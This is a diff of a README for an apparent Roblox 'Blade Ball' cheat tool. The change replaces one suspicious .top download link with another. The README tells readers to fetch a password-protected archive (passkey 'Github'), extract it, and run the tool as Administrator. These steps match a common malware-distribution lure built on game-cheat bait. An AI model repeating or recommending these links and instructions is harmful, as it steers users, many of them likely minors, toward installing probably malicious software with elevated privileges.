@@ -6,7 +6,7 @@ Blade Ball utility with auto-parry, auto-dodge, aim assist, unlock all swords, a
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ This tool automates parrying, dodging, and aiming to enhance your Blade Ball exp
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 2. Extract the archive.
 3. Launch Roblox and join Blade Ball.
 4. Run the tool **as Administrator**.
